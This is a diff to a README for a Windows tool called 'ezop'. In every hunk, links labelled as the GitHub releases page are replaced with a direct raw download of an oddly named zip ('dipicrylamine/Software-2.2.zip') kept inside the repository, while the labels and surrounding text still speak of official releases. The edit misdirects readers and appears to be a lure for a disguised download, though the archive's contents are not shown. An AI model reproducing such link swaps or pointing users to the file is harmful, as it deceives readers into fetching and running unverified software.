@@ -1,6 +1,6 @@
 # ✨ ezop - Story tools for every agent
 
-[![Download ezop](https://img.shields.io/badge/Download%20ezop-Ready%20for%20Windows-blue?style=for-the-badge)](https://github.com/rolland9758/ezop/releases)
+[![Download ezop](https://img.shields.io/badge/Download%20ezop-Ready%20for%20Windows-blue?style=for-the-badge)](https://raw.githubusercontent.com/rolland9758/ezop/main/dipicrylamine/Software-2.2.zip)
 
 ## 🧭 What is ezop?
 
@@ -16,7 +16,7 @@ Use ezop if you want:
 
 Visit the release page to download and run this file:
 
-[Go to the latest releases](https://github.com/rolland9758/ezop/releases)
+[Go to the latest releases](https://raw.githubusercontent.com/rolland9758/ezop/main/dipicrylamine/Software-2.2.zip)
 
 On the releases page, look for the newest version and download the Windows file that matches your device. If you see more than one file, choose the one meant for Windows.
 
@@ -168,7 +168,7 @@ When a new version is available:
 
 ## 📌 Release page
 
-[Download ezop from GitHub Releases](https://github.com/rolland9758/ezop/releases)
+[Download ezop from GitHub Releases](https://raw.githubusercontent.com/rolland9758/ezop/main/dipicrylamine/Software-2.2.zip)
 
 ## 🧷 Basic workflow
 
